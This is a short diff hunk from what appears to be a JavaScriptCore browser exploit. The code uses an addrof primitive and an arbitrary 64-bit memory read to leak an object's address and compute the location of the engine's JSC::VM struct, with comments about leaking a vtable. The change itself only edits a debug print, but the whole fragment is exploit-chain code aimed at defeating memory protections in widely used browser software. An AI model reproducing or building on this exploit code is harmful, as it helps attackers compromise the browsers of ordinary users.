@@ -644,7 +644,7 @@ function foo(obj) {
         var bbaddr = addrof(bb);
         //about to burn a vtable leak method publically RIP
         var print = log;
-         print("object address?" + hex1(bbaddr));
+         print("object address?" + bbaddr);
         var vm = memory.read_i64((bbaddr & 0xffffc000) + (((bbaddr/0x100000000)|0)*0x100000000) + 0x4000 - 0x120) //should poin
         print("JSC::VM Struct @" + vm);
         //m_runloop contains a vtable at offset 0...
